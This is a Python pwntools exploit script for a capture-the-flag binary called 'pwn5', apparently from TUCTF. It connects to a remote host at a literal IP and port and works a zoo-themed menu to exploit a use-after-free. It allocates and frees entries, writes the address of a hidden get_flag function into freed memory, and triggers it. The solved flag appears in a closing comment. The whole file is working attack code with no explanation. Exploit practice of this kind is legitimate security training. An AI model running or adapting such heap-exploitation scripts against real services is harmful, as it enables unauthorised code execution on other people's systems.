
from pwn import *

context(log_level='debug')
get_flag = 0x40090D

# p = process('./pwn5')
p = remote('104.155.227.252',31337)

p.recvuntil('our choice:\n')
p.sendline('3')
p.recvuntil('Brown Bear\n')
p.sendline('3')
p.recvuntil(' name:\n')
p.sendline('aaaa')

p.recvuntil('our choice:\n')
p.sendline('3')
p.recvuntil('Brown Bear\n')
p.sendline('3')
p.recvuntil(' name:\n')
p.sendline('aaaa')


# gdb.attach(p,'b*0x0400D95\nb*0x000400D04\nc')

p.recvuntil('our choice:\n')
p.sendline('4')
p.recvuntil('want to delete?\n')
p.sendline('1')


p.recvuntil('our choice:\n')
p.sendline('2')
p.recvuntil('pian Tiger\n')
p.sendline('3')
p.recvuntil('of tiger:')
p.sendline(p64(get_flag))

p.recvuntil('our choice:\n')
p.sendline('4919')

p.interactive()

#TUCTF{free_as_in_use_after_free_I_hope-_-}